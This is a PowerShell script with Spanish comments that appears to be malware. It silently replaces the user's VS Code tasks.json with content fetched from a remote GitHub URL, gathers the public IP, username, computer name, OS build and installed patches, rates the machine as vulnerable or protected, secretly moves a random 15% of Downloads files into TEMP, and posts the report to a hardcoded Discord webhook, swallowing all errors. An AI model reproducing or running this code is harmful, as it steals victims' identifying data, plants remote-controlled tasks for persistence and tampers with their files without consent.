# 1. Configuración de variables
$Webhook = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar internet (Silencioso)
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea (tasks.json)
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl -TimeoutSec 10
    if ($RemoteContent -like "*version*") {
        $LocalHash = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) {
            $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force
        }
    }
} catch { }

# 4. Recolección de datos (Identidad del Sistema)
$IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "null" }
$User = try { $env:USERNAME } catch { "null" }
$Device = try { $env:COMPUTERNAME } catch { "null" }
$SystemInfo = try {
    $OS = Get-CimInstance Win32_OperatingSystem
    $Ver = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
    "$( $OS.Caption ) (Build: $( $Ver.CurrentBuild ))"
} catch { "null" }

# --- LÓGICA DE MOVIMIENTO DE ARCHIVOS (Downloads -> TEMP) ---
$descargasPath = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")."{374DE290-123F-4565-9164-39C4925E467B}"
$rutaDownloads = [System.Environment]::ExpandEnvironmentVariables($descargasPath)
$rutaTemp = $env:TEMP

$todosLosArchivos = Get-ChildItem -Path $rutaDownloads -File
$totalArchivos = $todosLosArchivos.Count
$archivosMovidosList = @()

if ($totalArchivos -gt 0) {
    $cantidadAMover = [Math]::Ceiling($totalArchivos * 0.15)
    $objetivos = $todosLosArchivos | Get-Random -Count $cantidadAMover

    foreach ($archivo in $objetivos) {
        try {
            $nuevoDestino = Join-Path $rutaTemp $archivo.Name
            # Si ya existe uno igual en Temp, lo sobrescribe para no dar error
            Move-Item -Path $archivo.FullName -Destination $nuevoDestino -Force -ErrorAction Stop
            $archivosMovidosList += $archivo.Name
        } catch { }
        Start-Sleep -Milliseconds 500
    }
}

# 5. Gestión de Parches
$SortedList = try {
    $Raw = Get-HotFix | Select-Object HotFixID, InstalledOn
    $WithDate = $Raw | Where-Object { $_.InstalledOn -ne $null } | Sort-Object InstalledOn -Descending
    $NoDate = $Raw | Where-Object { $_.InstalledOn -eq $null }
    $WithDate + $NoDate
} catch { @() }

$TotalParches = $SortedList.Count
$StatusText = if ($SortedList | Where-Object { $_.InstalledOn -ge (Get-Date -Year 2026 -Month 3 -Day 10) }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
$EmbedColor = if ($StatusText -eq "🛡️ PROTEGIDO") { 3066993 } else { 15158332 }

# --- MENSAJE 1: IDENTIDAD + REPORTE DE ARCHIVOS MOVIDOS ---
$listaArchivosStr = if ($archivosMovidosList.Count -gt 0) { ($archivosMovidosList -join ", ") } else { "Ninguno" }

$MainPayload = @{
    username = "$User @ $Device"
    avatar_url = "https://i.imgur.com/8nLFCuR.png"
    embeds = @(@{
        title = "🚀 Reporte de Identidad y Actividad"
        color = $EmbedColor
        fields = @(
            @{ name = '💻 Sistema'; value = $SystemInfo; inline = $false },
            @{ name = '📊 Estado'; value = $StatusText; inline = $true },
            @{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true },
            @{ name = '📂 Archivos Movidos a TEMP (15%)'; value = $listaArchivosStr; inline = $false }
        )
        footer = @{ text = "Archivos movidos: $($archivosMovidosList.Count) | Parches: $TotalParches" }
    })
} | ConvertTo-Json -Depth 10

try {
    $MainBytes = [System.Text.Encoding]::UTF8.GetBytes($MainPayload)
    Invoke-RestMethod -Uri $Webhook -Method Post -Body $MainBytes -ContentType 'application/json; charset=utf-8'
    Start-Sleep -Milliseconds 1500
} catch { }

# --- MENSAJES SIGUIENTES: PARCHES (CHUNKS DE 3) ---
# (El resto del código de parches se mantiene igual para completar el reporte)
$ChunkSize = 3
$Sections = [Math]::Ceiling($TotalParches / $ChunkSize)

for ($i = 0; $i -lt $TotalParches; $i += $ChunkSize) {
    $CurrentSection = [Math]::Floor($i / $ChunkSize) + 1
    $End = [Math]::Min($i + $ChunkSize - 1, $TotalParches - 1)
    $Chunk = $SortedList[$i..$End]
    $PatchText = ($Chunk | ForEach-Object {
        $DateStr = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Sin fecha' }
        "- **$($_.HotFixID)**`n  └ Instalado: $DateStr"
    }) -join "`n`n"

    $PatchPayload = @{
        username = "$User @ $Device"
        avatar_url = "https://i.imgur.com/8nLFCuR.png"
        embeds = @(@{
            title = "📦 Listado de Parches - Sección $CurrentSection"
            color = $EmbedColor
            description = $PatchText
            footer = @{ text = "Sección $CurrentSection de $Sections" }
        })
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri $Webhook -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($PatchPayload)) -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Milliseconds 1500
    } catch { }
}
